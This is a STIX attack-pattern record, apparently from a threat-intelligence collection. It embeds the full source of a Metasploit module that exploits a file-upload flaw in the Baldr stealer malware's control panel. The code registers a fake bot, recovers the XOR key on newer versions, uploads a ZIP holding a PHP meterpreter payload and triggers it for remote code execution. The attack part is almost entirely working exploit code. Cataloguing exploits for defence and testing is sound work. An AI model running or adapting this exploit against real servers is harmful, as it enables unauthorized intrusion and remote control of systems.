{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c0d778fa-692b-4f47-9b3e-4ad070038f27",
    "created": "2024-08-14T17:09:43.563066Z",
    "modified": "2024-08-14T17:09:43.56307Z",
    "name": "Baldr Botnet Panel Shell Upload Exploit",
    "description": " This module exploits an arbitrary file upload vulnerability within the Baldr stealer malware control panel when uploading victim log files (which are uploaded as ZIP files). Attackers can turn this vulnerability into an RCE by first registering a new bot to the panel and then uploading a ZIP file containing malicious PHP, which will then uploaded to a publicly accessible directory underneath the /logs web directory.  Note that on versions 3.0 and 3.1 the ZIP files containing the victim log files are encoded by XORing them with a random 4 byte key. This exploit module gets around this restriction by retrieving the IP specific XOR key from panel gate before uploading the malicious ZIP file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/baldr_upload_exec.rb",
            "external_id": "baldr_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://krabsonsecurity.com/2019/06/04/taking-a-look-at-baldr-stealer/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.malwarebytes.com/threat-analysis/2019/04/say-hello-baldr-new-stealer-market/"
        },
        {
            "source_name": "reference",
            "url": "https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/baldr-vs-the-world.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Baldr Botnet Panel Shell Upload Exploit',\n        'Description' => %q{\n          This module exploits an arbitrary file upload vulnerability within the Baldr\n          stealer malware control panel when uploading victim log files (which are uploaded\n          as ZIP files). Attackers can turn this vulnerability into an RCE by first\n          registering a new bot to the panel and then uploading a ZIP file containing\n          malicious PHP, which will then uploaded to a publicly accessible\n          directory underneath the /logs web directory.\n\n          Note that on versions 3.0 and 3.1 the ZIP files containing the victim log files\n          are encoded by XORing them with a random 4 byte key. This exploit module gets around\n          this restriction by retrieving the IP specific XOR key from panel gate before\n          uploading the malicious ZIP file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ege Balc\u0131 <egebalci@pm.me>' # author & msf module\n        ],\n        'References' => [\n          ['URL', 'https://krabsonsecurity.com/2019/06/04/taking-a-look-at-baldr-stealer/'],\n          ['URL', 'https://blog.malwarebytes.com/threat-analysis/2019/04/say-hello-baldr-new-stealer-market/'],\n          ['URL', 'https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/baldr-vs-the-world.pdf'],\n        ],\n        'DefaultOptions' => {\n          'SSL' => false,\n          'WfsDelay' => 5\n        },\n        'Platform' => [ 'php' ],\n        'Arch' => [ ARCH_PHP ],\n        'Targets' => [\n          [\n            'Auto',\n            {\n              'Platform' => 'PHP',\n              'Arch' => ARCH_PHP,\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/bind_tcp' }\n            }\n          ],\n          [\n            '<= v2.0',\n            {\n              'Platform' => 'PHP',\n              'Arch' => ARCH_PHP,\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/bind_tcp' }\n            }\n          ],\n          [\n            'v2.2',\n            {\n              'Platform' => 'PHP',\n              'Arch' => ARCH_PHP,\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/bind_tcp' }\n            }\n          ],\n          [\n            'v3.0 & v3.1',\n            {\n              'Platform' => 'PHP',\n              'Arch' => ARCH_PHP,\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/bind_tcp' }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2018-12-19',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the baldr gate', '/']),\n      ]\n    )\n  end\n\n  def check\n    if select_target\n      Exploit::CheckCode::Appears(\"Baldr Version: #{select_target.name}\")\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def select_target\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'gate.php')\n    )\n    if res && res.code == 200\n      if res.body.include?('~;~')\n        targets[3]\n      elsif res.body.include?(';')\n        targets[2]\n      elsif res.body.size < 4\n        targets[1]\n      end\n    end\n  end\n\n  def exploit\n    # Forge the payload\n    name = \".#{Rex::Text.rand_text_alpha(4)}\"\n    files =\n      [\n        { data: payload.encoded, fname: \"#{name}.php\" }\n      ]\n    zip = Msf::Util::EXE.to_zip(files)\n    hwid = Rex::Text.rand_text_alpha(8).upcase\n\n    gate_uri = normalize_uri(target_uri.path, 'gate.php')\n    version = select_target\n    # If not 'Auto' then use the selected version\n    if target != targets[0]\n      version = target\n    end\n\n    gate_res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => gate_uri\n    })\n    os = Rex::Text.rand_text_alpha(8..12)\n\n    case version\n    when targets[3]\n      fail_with(Failure::NotFound, 'Failed to obtain response') unless gate_res\n      unless gate_res.code != 200 || gate_res.body.to_s.include?('~;~')\n        fail_with(Failure::UnexpectedReply, 'Could not obtain gate key')\n      end\n      key = gate_res.body.to_s.split('~;~')[0]\n      print_good(\"Key: #{key}\")\n\n      data = \"hwid=#{hwid}&os=#{os}&cookie=0&paswd=0&credit=0&wallet=0&file=1&autofill=0&version=v3.0\"\n      data = Rex::Text.xor(key, data)\n\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => gate_uri,\n        'data' => data.to_s\n      })\n\n      fail_with(Failure::UnexpectedReply, 'Could not obtain gate key') unless res && res.code == 200\n      print_good('Bot successfully registered.')\n\n      data = Rex::Text.xor(key, zip.to_s)\n      form = Rex::MIME::Message.new\n      form.add_part(data.to_s, 'application/octet-stream', 'binary', \"form-data; name=\\\"file\\\"; filename=\\\"#{hwid}.zip\\\"\")\n\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => gate_uri,\n        'ctype' => \"multipart/form-data; boundary=#{form.bound}\",\n        'data' => form.to_s\n      })\n\n      if res && res.code == 200\n        print_good(\"Payload uploaded to /logs/#{hwid}/#{name}.php\")\n        register_file_for_cleanup(\"#{name}.php\")\n      else\n        print_error(\"Server responded with code #{res.code}\")\n        fail_with(Failure::UnexpectedReply, 'Failed to upload payload')\n      end\n    when targets[2]\n      fail_with(Failure::NotFound, 'Failed to obtain response') unless gate_res\n      unless gate_res.code != 200 || gate_res.body.to_s.include?('~;~')\n        fail_with(Failure::UnexpectedReply, 'Could not obtain gate key')\n      end\n\n      key = gate_res.body.to_s.split(';')[0]\n      print_good(\"Key: #{key}\")\n      data = \"hwid=#{hwid}&os=Windows 7 x64&cookie=0&paswd=0&credit=0&wallet=0&file=1&autofill=0&version=v2.2***\"\n      data << zip.to_s\n      result = Rex::Text.xor(key, data)\n\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => gate_uri,\n        'data' => result.to_s\n      })\n\n      unless res && res.code == 200\n        print_error(\"Server responded with code #{res.code}\")\n        fail_with(Failure::UnexpectedReply, 'Failed to upload payload')\n      end\n\n      print_good(\"Payload uploaded to /logs/#{hwid}/#{name}.php\")\n    else\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => gate_uri,\n        'data' => zip.to_s,\n        'encode_params' => true,\n        'vars_get' => {\n          'hwid' => hwid,\n          'os' => os,\n          'cookie' => '0',\n          'pswd' => '0',\n          'credit' => '0',\n          'wallet' => '0',\n          'file' => '1',\n          'autofill' => '0',\n          'version' => 'v2.0'\n        }\n      })\n\n      if res && res.code == 200\n        print_good(\"Payload uploaded to /logs/#{hwid}/#{name}.php\")\n      else\n        print_error(\"Server responded with code #{res.code}\")\n        fail_with(Failure::UnexpectedReply, 'Failed to upload payload')\n      end\n    end\n\n    vprint_status('Triggering payload')\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'logs', hwid, \"#{name}.php\")\n    }, 3)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-12-19",
    "x_mitre_platforms": [
        "PHP'"
    ]
}